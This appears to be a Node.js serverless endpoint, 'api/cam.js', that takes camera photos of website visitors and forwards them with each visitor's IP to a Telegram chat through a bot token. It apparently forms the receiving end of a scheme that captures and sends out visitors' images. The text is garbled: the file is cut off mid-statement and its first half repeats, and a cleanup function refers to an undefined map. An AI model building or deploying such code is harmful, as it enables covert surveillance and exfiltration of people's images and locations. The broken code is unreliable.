// api/cam.js — receives visitor camera snap and forwards to Telegram with SOC caption
const TOKEN = process.env.TG_BOT_TOKEN;
const CHAT = process.env.TG_CHAT_ID;

const recentSnaps = new Map();
const COOLDOWN_MS = 8 * 1000; // 8s debounce per IP

function cleanupOldSnaps() {
  const now = Date.now();
  for (const [ip, time] of recentSnaps.entries()) {
    if (now - time > COOLDOWN_MS) recentVisitors.delete(ip);
  }
}

function extractPhoto(body) {
  if (!body) return null;
  if (typeof body === 'object' && !Buffer.isBuffer(body) && body.photo) return body.photo;
  if (typeof body === 'string') {
    try { return JSON.parse(body).photo || null; } catch (e) {}
  }
  if (Buffer.isBuffer(body)) {
    try { return JSON.parse(body.toString()).photo || null; } catch (e) {}
  }
  return null;
}

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Content-Type', 'application/json');
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const ip =
      (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
      req.headers['x-real-ip'] ||// api/cam.js — receives visitor camera snap and forwards to Telegram with SOC caption
const TOKEN = process.env.TG_BOT_TOKEN;
const CHAT = process.env.TG_CHAT_ID;

const recentSnaps = new Map();
const COOLDOWN_MS = 8 * 1000; // 8s debounce per IP

function cleanupOldSnaps() {
  const now = Date.now();
  for (const [ip, time] of recentSnaps.entries()) {
    if (now - time > COOLDOWN_MS) recentVisitors.delete(ip);
  }
}

function extractPhoto(body) {
  if (!body) return null;
  if (typeof body === 'object' && !Buffer.isBuffer(body) && body.photo) return body.photo;
  if (typeof body === 'string') {
    try { return JSON.parse(body).photo || null; } catch (e) {}
  }
  if (Buffer.isBuffer(body)) {
    try { return JSON.parse(body.toString()).photo || null; } catch (e) {}
  }
  return null;
}

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Content-Type', 'application/json');
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const ip =
      (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
      req.headers['x-real-ip'] ||
